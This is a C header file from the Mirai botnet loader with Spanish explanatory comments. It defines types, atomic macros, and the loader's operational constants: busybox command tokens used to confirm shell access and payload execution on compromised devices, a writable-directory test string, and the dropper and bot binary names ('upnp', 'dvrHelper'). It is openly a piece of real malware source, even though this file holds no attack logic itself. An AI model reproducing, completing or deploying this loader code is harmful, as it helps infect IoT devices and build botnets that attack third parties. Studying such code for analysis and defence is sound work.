/**************************************************************************
 * Archivo: includes.h
 * 
 * Descripción: Definiciones y tipos comunes para todo el loader de Mirai.
 * Este archivo proporciona:
 * - Definiciones de tipos básicos
 * - Constantes del sistema
 * - Macros para operaciones atómicas
 * - Tokens y cadenas de verificación
 * 
 * Es la base común que unifica las definiciones usadas en todo
 * el código del loader.
 **************************************************************************/

#pragma once

/***************************************************************************
 * Inclusión de cabeceras estándar
 ***************************************************************************/
#include <stdint.h>    /* Tipos enteros de tamaño fijo */

/***************************************************************************
 * Descriptores de archivo estándar
 ***************************************************************************/
#define STDIN   0      /* Entrada estándar */
#define STDOUT  1      /* Salida estándar */
#define STDERR  2      /* Salida de error estándar */

/***************************************************************************
 * Definiciones booleanas y tipos básicos
 ***************************************************************************/
#define FALSE   0      /* Valor falso */
#define TRUE    1      /* Valor verdadero */
typedef char BOOL;     /* Tipo booleano básico */

/* Tipos personalizados para IP y puerto */
typedef uint32_t ipv4_t;   /* Dirección IPv4 (32 bits) */
typedef uint16_t port_t;   /* Número de puerto (16 bits) */

/***************************************************************************
 * Configuración de endianness
 ***************************************************************************/
#define LOADER_LITTLE_ENDIAN    /* Loader compilado para arquitecturas little-endian */

/***************************************************************************
 * Macros para operaciones atómicas thread-safe
 * 
 * Estas macros proporcionan operaciones seguras en entornos multi-hilo:
 * - Garantizan atomicidad en la operación
 * - Evitan condiciones de carrera
 * - Son esenciales para contadores compartidos
 ***************************************************************************/
#define ATOMIC_ADD(ptr,i) __sync_fetch_and_add((ptr),i)   /* Suma atómica */
#define ATOMIC_SUB(ptr,i) __sync_fetch_and_sub((ptr),i)   /* Resta atómica */
#define ATOMIC_INC(ptr) ATOMIC_ADD((ptr),1)               /* Incremento atómico */
#define ATOMIC_DEC(ptr) ATOMIC_SUB((ptr),1)               /* Decremento atómico */
#define ATOMIC_GET(ptr) ATOMIC_ADD((ptr),0)               /* Lectura atómica */

/***************************************************************************
 * Cadenas de verificación y tokens del sistema
 ***************************************************************************/

/* Cadenas para verificación de directorios escribibles */
#define VERIFY_STRING_HEX   "\\x6b\\x61\\x6d\\x69"  /* Cadena de prueba en hex */
#define VERIFY_STRING_CHECK "kami"                   /* Cadena de verificación */

/* Tokens para verificar la ejecución de comandos */
#define TOKEN_QUERY     "/bin/busybox ECCHI"         /* Comando de prueba */
#define TOKEN_RESPONSE  "ECCHI: applet not found"    /* Respuesta esperada */

/* Tokens para verificar la ejecución del payload */
#define EXEC_QUERY     "/bin/busybox IHCCE"         /* Comando de verificación */
#define EXEC_RESPONSE  "IHCCE: applet not found"    /* Respuesta esperada */

/***************************************************************************
 * Nombres de archivo para componentes del sistema
 ***************************************************************************/

/* Nombres de archivos críticos */
#define FN_DROPPER  "upnp"       /* Nombre del archivo dropper */
#define FN_BINARY   "dvrHelper"  /* Nombre del binario principal */

/* Variables globales */
extern char *id_tag;             /* Identificador único de la sesión */
